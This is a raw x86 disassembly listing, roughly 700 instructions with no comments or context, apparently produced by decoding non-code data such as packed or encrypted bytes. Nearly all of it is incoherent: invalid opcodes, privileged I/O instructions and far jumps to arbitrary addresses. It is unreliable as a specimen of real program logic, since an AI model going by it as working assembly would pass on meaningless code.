  41ba3b:	repnz out dx,al
  41ba3d:	dec    ebp
  41ba3e:	mov    ebx,0x7fc9ceb5
  41ba43:	int    0xa1
  41ba45:	or     ah,BYTE PTR [ebp+0x7a]
  41ba48:	xchg   edi,eax
  41ba49:	inc    esp
  41ba4a:	push   ebp
  41ba4b:	adc    DWORD PTR [edx],edx
  41ba4d:	add    al,0x1d
  41ba4f:	mov    al,0xb9
  41ba51:	imul   BYTE PTR [edi-0x61]
  41ba54:	test   BYTE PTR [esi-0x2fc85202],al
  41ba5a:	dec    ecx
  41ba5b:	xor    eax,0x69e7104c
  41ba60:	push   edx
  41ba61:	and    BYTE PTR [eax-0x3],bh
  41ba64:	fistp  DWORD PTR [eax+0x7]
  41ba67:	jge    0x41bab8
  41ba69:	(bad)  
  41ba6a:	into   
  41ba6b:	inc    eax
  41ba6c:	pop    ds
  41ba6d:	add    al,0x10
  41ba6f:	not    DWORD PTR [edi+0x62070191]
  41ba75:	loopne 0x41b9ff
  41ba77:	ror    al,cl
  41ba79:	fs icebp 
  41ba7b:	data16 ins BYTE PTR es:[edi],dx
  41ba7d:	fimul  WORD PTR [ecx]
  41ba7f:	mov    eax,DWORD PTR [ecx]
  41ba81:	lds    eax,FWORD PTR [esi+ecx*2]
  41ba84:	xor    BYTE PTR [edi],ah
  41ba86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba87:	inc    eax
  41ba88:	ins    DWORD PTR es:[edi],dx
  41ba89:	mov    dh,0x69
  41ba8b:	enter  0x3fa0,0xb5
  41ba8f:	stos   BYTE PTR es:[edi],al
  41ba90:	or     esi,edx
  41ba92:	jmp    0x41ba27
  41ba94:	leave  
  41ba95:	fimul  DWORD PTR [ebp+eiz*2-0x49]
  41ba99:	ficomp WORD PTR [edx+ecx*2-0x7]
  41ba9d:	jg     0x41baf0
  41ba9f:	stc    
  41baa0:	fistp  DWORD PTR [ecx-0x8]
  41baa3:	jp     0x41baae
  41baa5:	xchg   ebp,eax
  41baa6:	and    DWORD PTR [ebx+edx*4],esi
  41baa9:	mov    esp,0x359b54c7
  41baae:	test   BYTE PTR [ecx+0x1b],0x64
  41bab2:	push   0x39ff2fcb
  41bab7:	jl     0x41ba39
  41bab9:	xchg   ebp,eax
  41baba:	lea    edi,[esi-0x3e]
  41babd:	push   esp
  41babe:	push   0xffffff9f
  41bac0:	pop    ds
  41bac1:	and    eax,0xd62a5421
  41bac6:	sar    DWORD PTR [ecx],1
  41bac8:	bound  esp,QWORD PTR [edx+0xe]
  41bacb:	mov    esp,0x12b271ba
  41bad0:	add    bl,0xcd
  41bad3:	jge    0x41bb52
  41bad5:	mov    cl,0xcc
  41bad7:	mov    al,BYTE PTR [edi]
  41bad9:	xchg   BYTE PTR [ebx-0x50],al
  41badc:	pop    ds
  41badd:	and    al,0x2
  41badf:	std    
  41bae0:	or     eax,DWORD PTR [edi-0x1f527ed6]
  41bae6:	jmp    0xb089:0x34b43613
  41baed:	inc    ecx
  41baee:	add    eax,0x9668cd05
  41baf3:	ret    0x9ed8
  41baf6:	pop    es
  41baf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baf8:	and    eax,0xc5d94b71
  41bafd:	xchg   ebp,eax
  41bafe:	loop   0x41bb3d
  41bb00:	aam    0x76
  41bb02:	pusha  
  41bb03:	mov    ecx,0xdf79afa8
  41bb08:	and    eax,0xd817daf0
  41bb0d:	or     BYTE PTR [eax],0x39
  41bb10:	sub    BYTE PTR [ecx-0x388bb9b6],0x7c
  41bb17:	pop    ecx
  41bb18:	leave  
  41bb19:	jp     0x41bb4c
  41bb1b:	mov    ebx,DWORD PTR [ecx-0x66c37bad]
  41bb21:	inc    edi
  41bb22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb23:	xchg   ebp,eax
  41bb24:	pop    eax
  41bb25:	mov    dl,0xe2
  41bb27:	int3   
  41bb28:	push   ecx
  41bb29:	jno    0x41bb1c
  41bb2b:	adc    ah,cl
  41bb2d:	cdq    
  41bb2e:	mov    DWORD PTR [edi],0x2f20b4bd
  41bb34:	add    DWORD PTR [ebx+ecx*4+0x3ac8b52a],esp
  41bb3b:	bnd jae 0x41bb1e
  41bb3e:	dec    edx
  41bb3f:	jmp    0x41bb58
  41bb41:	cmp    eax,0x4e24cecd
  41bb46:	ja     0x41bbba
  41bb48:	bound  ebp,QWORD PTR [ebx]
  41bb4a:	es ret 
  41bb4c:	fist   WORD PTR [esi]
  41bb4e:	sub    eax,0x15172e06
  41bb53:	jp     0x41bb9d
  41bb55:	pop    esp
  41bb56:	hlt    
  41bb57:	mov    ?,ebp
  41bb59:	mov    al,0x13
  41bb5b:	scas   eax,DWORD PTR es:[edi]
  41bb5c:	jo     0x41bbae
  41bb5e:	sub    DWORD PTR [ebx-0x1975285f],ebp
  41bb64:	push   ds
  41bb65:	xchg   ecx,eax
  41bb66:	rol    BYTE PTR [edx+0x1b],1
  41bb69:	gs add eax,0x580f36fa
  41bb6f:	and    bh,cl
  41bb71:	and    edi,DWORD PTR [ecx+0x5a]
  41bb74:	mov    ch,0xab
  41bb76:	cld    
  41bb77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb78:	jnp    0x41bb92
  41bb7a:	jg     0x41bb44
  41bb7c:	fst    st(1)
  41bb7e:	or     DWORD PTR [ecx-0xd],esp
  41bb81:	int3   
  41bb82:	dec    esp
  41bb83:	(bad)  
  41bb84:	sub    ch,BYTE PTR [ebp-0x66]
  41bb87:	sub    eax,0x1fa8faa0
  41bb8c:	sub    DWORD PTR [ebx-0x37],edi
  41bb8f:	or     BYTE PTR [esi],0x40
  41bb92:	adc    BYTE PTR [edx+esi*2+0x6],cl
  41bb96:	ins    BYTE PTR es:[edi],dx
  41bb97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb98:	jns    0x41bbad
  41bb9a:	dec    esi
  41bb9b:	test   BYTE PTR [edx],al
  41bb9d:	scas   eax,DWORD PTR es:[edi]
  41bb9e:	sbb    DWORD PTR [ecx-0x6e945cea],ebx
  41bba4:	jmp    0x666b:0xa582eb03
  41bbab:	sar    DWORD PTR [esp+edi*8+0x7e03dc93],1
  41bbb2:	loope  0x41bba3
  41bbb4:	pusha  
  41bbb5:	push   ds
  41bbb6:	mov    WORD PTR [esp+eax*8],?
  41bbb9:	jge    0x41bba9
  41bbbb:	xor    ebx,DWORD PTR [edx-0x79d7b1b2]
  41bbc1:	jge    0x41bc39
  41bbc3:	xchg   ebx,eax
  41bbc4:	cdq    
  41bbc5:	repz les ebx,FWORD PTR [ecx+ebx*4]
  41bbc9:	imul   ebx,DWORD PTR [ecx],0xcecc7d36
  41bbcf:	cmp    bh,BYTE PTR [eax+0x62]
  41bbd2:	in     al,dx
  41bbd3:	xor    dh,ah
  41bbd5:	sub    edi,ebp
  41bbd7:	jno    0x41bc36
  41bbd9:	jmp    0x41bc37
  41bbdb:	inc    eax
  41bbdc:	add    BYTE PTR ds:0x6f89ff4d,ch
  41bbe2:	inc    BYTE PTR [eax+eiz*1+0x9]
  41bbe6:	retf   0x23e6
  41bbe9:	loop   0x41bbc5
  41bbeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbec:	sbb    al,0xc6
  41bbee:	inc    ebp
  41bbef:	mov    esi,0x623e77f3
  41bbf4:	push   0x65
  41bbf6:	into   
  41bbf7:	stc    
  41bbf8:	pusha  
  41bbf9:	loop   0x41bc32
  41bbfb:	in     eax,dx
  41bbfc:	jo     0x41bc12
  41bbfe:	adc    DWORD PTR [esp+edi*4],ecx
  41bc01:	(bad)  
  41bc02:	enter  0x1af1,0xbb
  41bc06:	sbb    BYTE PTR [ecx+0x3dabc1a7],bl
  41bc0c:	pop    eax
  41bc0d:	cmc    
  41bc0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc0f:	push   esi
  41bc10:	cmp    BYTE PTR [eax],dl
  41bc12:	inc    eax
  41bc13:	mov    eax,ds:0x6786f3d6
  41bc18:	(bad)  
  41bc19:	aad    0xa
  41bc1b:	dec    edx
  41bc1c:	dec    eax
  41bc1d:	fucomip st,st(4)
  41bc1f:	(bad)  
  41bc20:	into   
  41bc21:	sub    ebx,DWORD PTR [edx-0x197654a2]
  41bc27:	lds    esp,FWORD PTR [eax-0x2b44f59a]
  41bc2d:	cwde   
  41bc2e:	dec    esi
  41bc2f:	jmp    0x41bbd5
  41bc31:	inc    edx
  41bc32:	enter  0x1d85,0x5d
  41bc36:	add    DWORD PTR [ebx+0x64512e6f],eax
  41bc3c:	xor    al,0x4a
  41bc3e:	mov    ch,dl
  41bc40:	(bad)  
  41bc41:	mov    ebp,0x69769915
  41bc46:	sti    
  41bc47:	hlt    
  41bc48:	lea    esi,[ebx-0x4b7ba6af]
  41bc4e:	stos   DWORD PTR es:[edi],eax
  41bc4f:	mov    ch,0xce
  41bc51:	ins    BYTE PTR es:[edi],dx
  41bc52:	int    0xb5
  41bc54:	cmp    esp,DWORD PTR [eax+0x4d1a082f]
  41bc5a:	add    DWORD PTR [eax-0x68],esi
  41bc5d:	stc    
  41bc5e:	sub    edx,DWORD PTR [edi]
  41bc60:	push   ss
  41bc61:	xor    eax,0xe01fe801
  41bc66:	add    DWORD PTR [edx-0x7273b024],edx
  41bc6c:	popf   
  41bc6d:	(bad)
  41bc71:	or     DWORD PTR [ecx],esp
  41bc73:	aas    
  41bc74:	out    0x29,al
  41bc76:	jge    0x41bcdf
  41bc78:	test   al,0x11
  41bc7a:	cs ins DWORD PTR es:[edi],dx
  41bc7c:	jns    0x41bc4e
  41bc7e:	xor    al,0x2a
  41bc80:	(bad)  
  41bc81:	std    
  41bc82:	xchg   ebx,eax
  41bc83:	aad    0xb1
  41bc85:	dec    ebp
  41bc86:	add    BYTE PTR [ecx+esi*2],0xa6
  41bc8a:	mov    ds:0x876e7f06,al
  41bc8f:	jno    0x41bcaf
  41bc91:	jne    0x41bc67
  41bc93:	in     eax,0xc0
  41bc95:	mov    dh,0x1f
  41bc97:	fisubr DWORD PTR [ebx]
  41bc99:	iret   
  41bc9a:	fimul  WORD PTR [eax+0x7f]
  41bc9d:	mov    al,ds:0xe5b7e4cc
  41bca2:	sbb    al,0x76
  41bca4:	sbb    DWORD PTR [edi-0x3b],0x115b4113
  41bcab:	xor    esi,DWORD PTR [edi]
  41bcad:	lea    edi,[ebx+edx*4]
  41bcb0:	mov    dh,0x9a
  41bcb2:	popa   
  41bcb3:	mov    eax,DWORD PTR [ecx-0x71f5da90]
  41bcb9:	mov    ebp,edi
  41bcbb:	xchg   ebx,eax
  41bcbc:	adc    eax,0xcfa7d9e3
  41bcc1:	mov    eax,0x112b80d4
  41bcc6:	push   ecx
  41bcc7:	and    ebp,DWORD PTR [ebp-0x1d]
  41bcca:	dec    edi
  41bccb:	adc    esi,eax
  41bccd:	call   0x6bba6f1e
  41bcd2:	mov    dh,0xc7
  41bcd4:	add    BYTE PTR [edi-0x1eb41dd0],cl
  41bcda:	jp     0x41bd02
  41bcdc:	mov    edi,0xcd10f583
  41bce1:	dec    eax
  41bce2:	xor    ch,BYTE PTR [esi+ecx*2+0x49a1361]
  41bce9:	mov    esp,0x49551ff9
  41bcee:	add    BYTE PTR [ebp-0x62],al
  41bcf1:	pusha  
  41bcf2:	xchg   ecx,eax
  41bcf3:	or     eax,0x5f7b7d21
  41bcf8:	leave  
  41bcf9:	sahf   
  41bcfa:	and    DWORD PTR [edi-0x78],eax
  41bcfd:	pop    ebx
  41bcfe:	inc    ebx
  41bcff:	pop    ss
  41bd00:	(bad)  
  41bd02:	pop    es
  41bd03:	imul   esi,DWORD PTR [ebp-0x79],0x2e
  41bd07:	mov    al,cs:0x1ae948fe
  41bd0d:	in     al,0xef
  41bd0f:	mov    DWORD PTR [ebx+ecx*8],edi
  41bd12:	stos   DWORD PTR es:[edi],eax
  41bd13:	lods   eax,DWORD PTR ds:[esi]
  41bd14:	stos   BYTE PTR es:[edi],al
  41bd15:	mov    esp,0xac0ea0d7
  41bd1a:	xchg   ecx,eax
  41bd1b:	xchg   ecx,eax
  41bd1c:	dec    eax
  41bd1d:	fstp   st(7)
  41bd1f:	pop    ds
  41bd20:	xor    al,0xd9
  41bd22:	cmp    BYTE PTR [ecx],dh
  41bd24:	dec    edx
  41bd25:	pop    edi
  41bd26:	sbb    bh,BYTE PTR [eax+0x55]
  41bd29:	dec    ebx
  41bd2a:	sub    DWORD PTR [ecx-0x353bcd17],ebx
  41bd30:	jl     0x41bd24
  41bd32:	shl    DWORD PTR [ebp+0x5ba4fa1c],cl
  41bd38:	retf   
  41bd39:	cli    
  41bd3a:	popf   
  41bd3b:	mov    ds:0x856dbfa7,eax
  41bd40:	ret    0x621e
  41bd43:	jge    0x41bce8
  41bd45:	and    BYTE PTR [edx+0x77],ah
  41bd48:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41bd4a:	jno    0x41bd72
  41bd4c:	(bad)  
  41bd4d:	outs   dx,BYTE PTR ds:[esi]
  41bd4e:	sti    
  41bd4f:	lock fptan 
  41bd52:	jle    0x41bcf9
  41bd54:	sbb    eax,0xbdcf32b3
  41bd59:	imul   ebp
  41bd5b:	and    eax,0xfc09381a
  41bd60:	mov    ebp,0x1717c2f3
  41bd65:	mov    cl,0xd1
  41bd67:	jmp    0x5334c5c7
  41bd6c:	aas    
  41bd6d:	xchg   ecx,eax
  41bd6e:	pop    ebx
  41bd6f:	int3   
  41bd70:	add    al,0x84
  41bd72:	pop    esp
  41bd73:	out    0xda,eax
  41bd75:	xchg   BYTE PTR [ebx-0x46],dh
  41bd78:	lock or al,BYTE PTR [eax]
  41bd7b:	and    esp,0x96244c98
  41bd81:	clc    
  41bd82:	mov    DWORD PTR [ebp-0x1b1222c9],eax
  41bd88:	in     al,0xbb
  41bd8a:	lods   eax,DWORD PTR ds:[esi]
  41bd8b:	cdq    
  41bd8c:	sahf   
  41bd8d:	dec    BYTE PTR [edi+ebp*4+0x2b1c80d9]
  41bd94:	add    BYTE PTR [ecx+0x48bff2e],ch
  41bd9a:	inc    ecx
  41bd9b:	aad    0x8f
  41bd9d:	dec    esp
  41bd9e:	jae    0x41bd6e
  41bda0:	neg    BYTE PTR [ebx-0x2fe4c6b9]
  41bda6:	mov    ecx,0x24c65ec9
  41bdab:	push   ss
  41bdac:	int3   
  41bdad:	stos   DWORD PTR es:[edi],eax
  41bdae:	dec    eax
  41bdaf:	sub    cl,BYTE PTR es:[edi]
  41bdb2:	jg     0x41bd87
  41bdb4:	call   0x56cd:0xc45cc1da
  41bdbb:	cmp    BYTE PTR [ebx],al
  41bdbd:	mov    ecx,DWORD PTR [eax-0x46f8dca1]
  41bdc3:	mov    ebp,0xa6409aa7
  41bdc8:	mov    edi,0x94770128
  41bdcd:	xchg   edi,eax
  41bdce:	sub    cl,ch
  41bdd0:	outs   dx,DWORD PTR ds:[esi]
  41bdd1:	jl     0x41bdd5
  41bdd3:	and    ah,BYTE PTR [ebx-0x4d]
  41bdd6:	dec    esi
  41bdd7:	arpl   cx,bx
  41bdd9:	push   ss
  41bdda:	fld    QWORD PTR [ebx-0x69b3ebdd]
  41bde1:	ja     0x41bdab
  41bde3:	xchg   BYTE PTR [edx+ebx*4-0x6a7a2ae5],al
  41bdea:	aas    
  41bdeb:	dec    edi
  41bdec:	mov    dl,0x6d
  41bdee:	ss jno 0x41be66
  41bdf1:	dec    edi
  41bdf2:	mov    fs,WORD PTR [esi-0x3b9ec51d]
  41bdf8:	inc    edx
  41bdf9:	cmp    eax,0xf02219a4
  41bdfe:	in     eax,0xee
  41be00:	jge    0x41be51
  41be02:	mov    bh,0xe0
  41be04:	popa   
  41be05:	pop    eax
  41be06:	sbb    cl,cl
  41be08:	ja     0x41be7c
  41be0a:	ss lahf 
  41be0c:	sub    bl,0xb
  41be0f:	in     eax,dx
  41be10:	scas   al,BYTE PTR es:[edi]
  41be11:	xchg   ebp,eax
  41be12:	jle    0x41be0b
  41be14:	hlt    
  41be15:	mov    ebp,0x74424a41
  41be1a:	es daa 
  41be1c:	(bad)  
  41be1d:	scas   al,BYTE PTR es:[edi]
  41be1e:	das    
  41be1f:	pusha  
  41be20:	sbb    BYTE PTR [eax],0xd7
  41be23:	jns    0x41be75
  41be25:	aaa    
  41be26:	mov    edi,0xea64ad83
  41be2b:	mov    eax,ds:0x8f6fe534
  41be30:	adc    dl,bl
  41be32:	jae    0x41be76
  41be34:	adc    dh,BYTE PTR ds:0xf3218a21
  41be3a:	jp     0x41bdcc
  41be3c:	cmp    BYTE PTR [edi],0xde
  41be3f:	retf   
  41be40:	sbb    BYTE PTR [eax+0x3e35d711],bl
  41be46:	dec    edx
  41be47:	mov    ebx,0x4c36b5ec
  41be4c:	jae    0x41be68
  41be4e:	push   ebp
  41be4f:	inc    esp
  41be50:	and    cl,BYTE PTR [edi+0x60]
  41be53:	sar    DWORD PTR [edx-0x6b],1
  41be56:	mov    esi,0xf42358be
  41be5b:	call   0x18e4270c
  41be60:	inc    edx
  41be61:	jg     0x41be1c
  41be63:	hlt    
  41be64:	push   ecx
  41be65:	fadd   QWORD PTR [ebp-0x27]
  41be68:	mov    BYTE PTR [ecx+0x1dd6c3ae],0xa0
  41be6f:	pop    esp
  41be70:	(bad)  
  41be71:	adc    cl,al
  41be73:	cmp    DWORD PTR [edi+eiz*4],edx
  41be76:	dec    edx
  41be77:	adc    bh,BYTE PTR [ecx+0x4c]
  41be7a:	daa    
  41be7b:	jecxz  0x41be95
  41be7d:	loope  0x41be33
  41be7f:	push   cs
  41be80:	out    0x39,eax
  41be82:	neg    ah
  41be84:	les    edi,FWORD PTR [edx+0x39]
  41be87:	adc    ebx,DWORD PTR [eax+0x4a31a30b]
  41be8d:	add    al,0x47
  41be8f:	stos   BYTE PTR es:[edi],al
  41be90:	hlt    
  41be91:	popa   
  41be92:	aad    0xb8
  41be94:	outs   dx,BYTE PTR ds:[esi]
  41be95:	pop    edx
  41be96:	xchg   BYTE PTR [eax+esi*1+0x8],ah
  41be9a:	jmp    0xb523:0x6b02d305
  41bea1:	xchg   DWORD PTR [ebx],esi
  41bea3:	cmp    al,0xff
  41bea6:	pop    ebx
  41bea7:	jne    0x41be48
  41bea9:	xchg   ecx,eax
  41beaa:	test   eax,0xb803ee86
  41beaf:	push   esi
  41beb0:	pop    ss
  41beb1:	and    dl,BYTE PTR [eax+0x207d467a]
  41beb7:	mov    dh,0xef
  41beb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bebb:	fisub  DWORD PTR [eax+ecx*2]
  41bebe:	out    0x1,eax
  41bec0:	rcr    dh,0x5f
  41bec3:	test   al,0x9
  41bec5:	ret    
  41bec6:	shl    ebx,1
  41bec8:	mov    ecx,0x940a6a02
  41becd:	retf   
  41bece:	cmc    
  41becf:	jecxz  0x41be8d
  41bed1:	cmc    
  41bed2:	inc    ebx
  41bed3:	aam    0xdb
  41bed5:	stos   DWORD PTR es:[edi],eax
  41bed6:	mov    dh,0xf
  41bed8:	pop    es
  41bed9:	adc    dl,BYTE PTR [ebx+0x23]
  41bedc:	fild   WORD PTR [ebp+0x5bb1df31]
  41bee2:	enter  0xb76c,0xe6
  41bee6:	jp     0x41bf2c
  41bee8:	(bad)  [ecx+0x69703530]
  41beef:	popf   
  41bef0:	je     0x41bee9
  41bef2:	xchg   ecx,eax
  41bef3:	push   0x799fde42
  41bef8:	int3   
  41bef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41befa:	and    BYTE PTR ds:0xa114b4ad,bh
  41bf00:	pop    ecx
  41bf01:	or     ebx,DWORD PTR [eax]
  41bf03:	test   eax,0xc66d2f9b
  41bf08:	pop    esi
  41bf09:	jnp    0x41bf2d
  41bf0b:	push   edx
  41bf0c:	shl    BYTE PTR [ebp-0x73],0xfe
  41bf10:	mov    ebp,0xf1099784
  41bf15:	jg     0x41bf37
  41bf17:	xor    DWORD PTR cs:[eax],esi
  41bf1a:	imul   eax,DWORD PTR [ecx-0x8],0xffffffd8
  41bf1e:	push   0xffffffc8
  41bf20:	xor    eax,0x6eb76722
  41bf25:	inc    edx
  41bf26:	(bad)  
  41bf27:	jp     0x41bf01
  41bf29:	or     DWORD PTR [ebx+0x659c4c5a],ebx
  41bf2f:	fisttp DWORD PTR [ecx]
  41bf31:	(bad)  
  41bf32:	fadd   QWORD PTR [ecx+0x3f]
  41bf35:	ins    BYTE PTR es:[edi],dx
  41bf36:	push   ebx
  41bf37:	jb     0x41bf34
  41bf39:	cmp    eax,DWORD PTR [eax+0x77]
  41bf3c:	push   0x1c
  41bf3e:	in     al,dx
  41bf3f:	fsubrp st(1),st
  41bf41:	retf   0xd3a7
  41bf44:	bound  esp,QWORD PTR ds:0xa46d3ca3
  41bf4a:	jnp    0x41bf43
  41bf4c:	xchg   edx,eax
  41bf4d:	adc    esi,DWORD PTR [ebx+0x15f5e7cd]
  41bf53:	cmp    BYTE PTR [ecx+0x61d64fbb],al
  41bf59:	out    dx,eax
  41bf5a:	mov    al,0x23
  41bf5c:	adc    esi,DWORD PTR [edx-0x6e]
  41bf5f:	cmp    al,0x6b
  41bf61:	jmp    0x41bf7b
  41bf63:	sbb    esp,DWORD PTR [ecx]
  41bf65:	xchg   esp,eax
  41bf66:	push   ss
  41bf67:	fadd   QWORD PTR [esi+0x5aa484bb]
  41bf6d:	dec    eax
  41bf6e:	dec    edx
  41bf6f:	fisubr WORD PTR [ebx+eiz*4]
  41bf72:	rol    ebx,0xa3
  41bf75:	add    eax,ebx
  41bf77:	ss mov ds,WORD PTR ss:[esi]
  41bf7b:	rcr    DWORD PTR [edi],0xb8
  41bf7e:	sbb    BYTE PTR [ecx+0x537a39b6],0xfa
  41bf85:	loope  0x41bf0b
  41bf87:	cmp    DWORD PTR [edx-0x29],esi
  41bf8a:	jl     0x41c002
  41bf8c:	ret    
  41bf8d:	(bad)  
  41bf8e:	hlt    
  41bf8f:	ss mov ch,0x27
  41bf92:	xor    eax,0xb6dec30a
  41bf97:	sub    dl,BYTE PTR [ecx-0x24]
  41bf9a:	push   ecx
  41bf9b:	or     cl,ch
  41bf9d:	add    edx,ebp
  41bf9f:	mov    bh,0x6e
  41bfa1:	arpl   WORD PTR [ebx-0x61],bp
  41bfa4:	sbb    DWORD PTR [ecx],ebx
  41bfa6:	xor    eax,0x218811e6
  41bfab:	mov    esp,0xa4c4e59a
  41bfb0:	jmp    0xad170dde
  41bfb5:	stc    
  41bfb6:	mov    esp,0xeac7e7b2
  41bfbb:	push   cs
  41bfbc:	call   0x8b336e47
  41bfc1:	gs iret 
  41bfc3:	mov    ds:0xd06a9c6b,al
  41bfc8:	jl     0x41bfd7
  41bfca:	inc    ebp
  41bfcb:	dec    esp
  41bfcc:	data16 das 
  41bfce:	mov    esp,0x7e8e3015
  41bfd3:	jmp    FWORD PTR [ecx-0x30810b9f]
  41bfd9:	stc    
  41bfda:	js     0x41bf5f
  41bfdc:	fnsave [esi-0x2010af42]
  41bfe2:	jb     0x41c054
  41bfe4:	(bad)  
  41bfe5:	and    BYTE PTR [ebp+0x1d66c0],ch
  41bfeb:	(bad)  
  41bfed:	jnp    0x41c051
  41bfef:	loop   0x41c04a
  41bff1:	imul   esi,esp,0x64
  41bff4:	aam    0x60
  41bff6:	dec    esi
  41bff7:	jle    0x41c025
  41bff9:	mov    dl,0x19
  41bffb:	inc    edi
  41bffc:	outs   dx,BYTE PTR ds:[esi]
  41bffd:	jge    0x41c038
  41bfff:	out    0x3a,al
  41c001:	cwde   
  41c002:	sbb    esp,DWORD PTR [edi-0x26]
  41c005:	pushf  
  41c006:	ins    DWORD PTR es:[edi],dx
  41c007:	loope  0x41c064
  41c009:	xchg   esp,eax
  41c00a:	inc    edx
  41c00b:	sbb    al,0x64
  41c00d:	jp     0x41c033
  41c00f:	pop    edi
  41c010:	sbb    edi,edi
  41c012:	int    0x5f
  41c014:	sub    dh,dh
  41c016:	gs ss cs pop eax
  41c01a:	imul   ebp,DWORD PTR [edi],0xdfdaef2e
  41c020:	add    ah,BYTE PTR [ebx]
  41c022:	lods   al,BYTE PTR ds:[esi]
  41c023:	stos   BYTE PTR es:[edi],al
  41c024:	sbb    DWORD PTR ds:0xb9f117a1,0x7b
  41c02b:	mov    dl,0x5e
  41c02d:	cs push ebp
  41c02f:	daa    
  41c030:	dec    edi
  41c031:	icebp  
  41c032:	imul   eax,esi,0xffffff94
  41c035:	imul   ebp,DWORD PTR [ecx],0x71
  41c038:	lock pop ds
  41c03a:	sub    al,0x67
  41c03c:	mov    WORD PTR [edx-0x76],?
  41c03f:	pop    ebx
  41c040:	popf   
  41c041:	and    eax,0x90e2843e
  41c046:	mov    ecx,DWORD PTR [esi+edi*4+0x1f]
  41c04a:	jecxz  0x41c012
  41c04c:	pop    edi
  41c04d:	cld    
  41c04e:	and    al,0x21
  41c050:	lods   eax,DWORD PTR ds:[esi]
  41c051:	addr16 fwait
  41c053:	stos   BYTE PTR es:[edi],al
  41c054:	mov    al,BYTE PTR [esi-0x3891ca73]
  41c05a:	dec    ebp
  41c05b:	stos   BYTE PTR es:[edi],al
  41c05c:	repnz push ds
  41c05e:	or     al,0x78
  41c060:	test   DWORD PTR [edi+0x3451d658],0xd216312d
  41c06a:	idiv   BYTE PTR [eax-0x51]
  41c06d:	pushf  
  41c06e:	mov    ch,0xdd
  41c070:	fwait
  41c071:	loop   0x41c08a
  41c073:	cmc    
  41c074:	fdiv   QWORD PTR [edx+ebx*1]
  41c077:	call   0x7382:0xb5f197ac
  41c07e:	enter  0x371a,0x84
  41c082:	xchg   esp,eax
  41c083:	test   eax,0xfb63f972
  41c088:	add    al,0xa9
  41c08a:	dec    edx
  41c08b:	inc    ecx
  41c08c:	clc    
  41c08d:	push   cs
  41c08e:	xchg   esp,eax
  41c08f:	xchg   edi,eax
  41c090:	xchg   edx,eax
  41c091:	mov    ah,0x8d
  41c093:	je     0x41c105
  41c095:	pop    ds
  41c096:	call   0x67b32615
  41c09b:	sbb    edi,DWORD PTR [ebx-0x4fe74782]
  41c0a1:	jl     0x41c054
  41c0a3:	xchg   ebp,eax
  41c0a4:	pop    ebp
  41c0a5:	add    DWORD PTR ds:0xfd5956de,eax
  41c0ab:	out    0x96,eax
  41c0ad:	sub    ebp,DWORD PTR [esi-0x16db260b]
  41c0b3:	push   ebp
  41c0b4:	leave  
  41c0b5:	fndisi(8087 only) 
  41c0b7:	pop    esi
  41c0b8:	dec    ebp
  41c0b9:	xor    DWORD PTR [edx+eax*8-0x490f79d1],esp
  41c0c0:	cs xchg ebx,eax
  41c0c2:	lock aaa 
  41c0c4:	retf   0x91db
  41c0c7:	push   ebp
  41c0c8:	aad    0x1f
  41c0ca:	jnp    0x41c14a
  41c0cc:	mov    eax,ds:0x647d64c6
  41c0d1:	lahf   
  41c0d2:	push   ss
  41c0d3:	pop    esi
  41c0d4:	outs   dx,DWORD PTR ds:[esi]
  41c0d5:	and    ah,bh
  41c0d7:	xchg   ecx,eax
  41c0d8:	push   es
  41c0d9:	sub    bh,dh
  41c0db:	cs test esi,0x5cc3cbe1
  41c0e2:	mov    bh,0xa7
  41c0e4:	cmp    dl,BYTE PTR [edx+edx*4+0x511278bb]
  41c0eb:	outs   dx,BYTE PTR ds:[esi]
  41c0ec:	sub    eax,0xc3fe5cc8
  41c0f1:	adc    BYTE PTR [ebx+0x115f90c5],cl
  41c0f7:	mov    ds:0xcabdce7d,al
  41c0fc:	adc    BYTE PTR [esi],dh
  41c0fe:	enter  0x4919,0x61
  41c102:	cmc    
  41c103:	std    
  41c104:	and    DWORD PTR [ebx+0x1a],eax
  41c107:	fisub  WORD PTR [edx]
  41c109:	ins    DWORD PTR es:[edi],dx
  41c10a:	outs   dx,DWORD PTR ds:[esi]
  41c10b:	stos   WORD PTR es:[edi],ax
  41c10d:	adc    BYTE PTR [esi+0x3f],cl
  41c110:	shl    DWORD PTR [edi-0x79],1
  41c113:	or     bl,BYTE PTR [ecx]
  41c115:	dec    edi
  41c116:	jne    0x41c153
  41c118:	in     eax,dx
  41c119:	and    BYTE PTR [edi-0x6a9c2d12],bl
  41c11f:	push   esp
  41c120:	lods   al,BYTE PTR ds:[esi]
  41c121:	sar    DWORD PTR [ebp+0x4],0x53
  41c125:	pop    edx
  41c126:	call   0xd98f:0xe48490f
  41c12d:	inc    edx
  41c12e:	inc    eax
  41c12f:	cmp    eax,0xc638f63e
  41c134:	jecxz  0x41c1b1
  41c136:	cdq    
  41c137:	data16 and al,0xe0
  41c13a:	cdq    
  41c13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c13c:	xor    BYTE PTR [ebp-0x27508898],dl
  41c142:	pushf  
  41c143:	jecxz  0x41c0f3
  41c145:	jl     0x41c18a
  41c147:	sub    dh,bl
  41c149:	or     BYTE PTR [eax],al
  41c14b:	call   0xa45d:0xd14b6a09
  41c152:	push   ebp
  41c153:	or     BYTE PTR [ebp+0x46],ch
  41c156:	rcr    esp,1
  41c158:	mov    DWORD PTR [ecx+0x1d],ebp
  41c15b:	pshufw mm2,mm1,0xad
  41c15f:	mov    dh,dh
  41c161:	sub    DWORD PTR [ebp+0x59f0e5a0],eax
  41c167:	enter  0xf4c,0xd9
  41c16b:	outs   dx,DWORD PTR ds:[esi]
  41c16c:	inc    ebp
  41c16d:	lea    ebp,[esi+0x4f]
  41c170:	jecxz  0x41c1b7
  41c172:	shl    DWORD PTR [eax+0x1b],0x9a
  41c176:	out    dx,eax
  41c177:	cmp    DWORD PTR [ecx],ecx
  41c179:	or     DWORD PTR [edx+edx*2-0x4d],0x14
  41c17e:	scas   al,BYTE PTR es:[edi]
  41c17f:	inc    esp
  41c180:	or     eax,0x1031bdc8
